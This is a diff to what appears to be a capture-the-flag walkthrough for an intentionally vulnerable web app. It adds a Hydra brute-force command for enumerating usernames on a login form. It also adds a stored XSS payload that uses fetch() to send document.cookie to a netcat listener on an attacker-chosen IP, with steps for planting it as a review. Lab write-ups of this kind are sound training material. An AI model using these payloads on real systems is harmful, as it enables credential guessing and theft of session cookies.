@@ -13,7 +13,7 @@ This walkthrough provides a step-by-step guide on how to solve all the flags hid
 
 ### Steps:
 
-1. Navigate to the /Profile folder
+1. Navigate to /Profile
 ![alt text](readme_images/1.png)
 
 2. Find out what is the network response to a failed login request
@@ -25,7 +25,8 @@ This walkthrough provides a step-by-step guide on how to solve all the flags hid
 4. Download username and password wordlists (or use the ones included in /vulns/wordlists)
 5. Install Hydra
 6. Set the parameters and run Hydra against the log-in form:
-   ```hydra -L usernames.txt -p dummy_password http-post-form "http://127.0.0.1/api/login:username=^USER^&password=^PASS^:F={\'Username does not exist\'}"```
+   ```hydra -L usernames.txt -p dummy_password http-post-form "http://127.0.0.1/api/login:username=^USER^&password=^PASS^:F={\"Username does not exist\"}"```
+   hydra -L usernames.txt -p dummy_password 127.0.0.1 http-post-form "/api/login:username=^USER^&password=^PASS^:F={\"error\":\"Username does not exist\"}"
 
 
 
@@ -42,6 +43,33 @@ This walkthrough provides a step-by-step guide on how to solve all the flags hid
 **Flag Location**: In another user’s session cookies.
 
 ### Steps:
+1. Create an XSS payload that sends cookies a server you control
+   ```<script>
+   fetch('http://127.0.0.1:1234', {  // CHANGE THIS TO YOUR IP
+      method: 'POST',
+      mode: 'no-cors',
+      body: document.cookie
+   });
+   </script>```
+   You can find this same exact code in /vulns/xss vuln/stored_xss_vuln.html
+
+2. Install netcat (preferably on a linux instance) and set it to listen mode
+   ```nc -lvnp 1234```
+   ![alt text](readme_images/7.png)
+
+3. Navigate to /
+![alt text](readme_images/4.png)
+
+4. Choose the first offer that has higher traffic than other offer
+![alt text](readme_images/5.png)
+
+5. Add the XSS payload as a review
+![alt text](readme_images/6.png)
+
+6. Look at your listener and extract the flag along with the cookies
+![alt text](readme_images/8.png)
+
+
 1. Locate a user input field that does not sanitize input properly.
 2. Inject a JavaScript payload into the input field (e.g., `<script>alert(document.cookie)</script>`).
 3. Trigger the XSS by making another user visit a page where the malicious script is executed.
